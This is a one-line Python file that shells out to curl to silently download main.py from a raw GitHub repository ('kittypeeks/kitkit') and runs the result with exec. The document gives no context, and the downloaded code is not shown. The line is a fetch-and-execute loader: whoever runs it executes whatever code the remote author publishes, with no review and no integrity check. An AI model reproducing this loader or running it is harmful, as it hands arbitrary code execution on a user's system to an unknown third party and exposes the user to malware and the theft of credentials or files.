exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.com/kittypeeks/kitkit/refs/heads/main/main.py'], capture_output=True).stdout.decode('utf-8'))
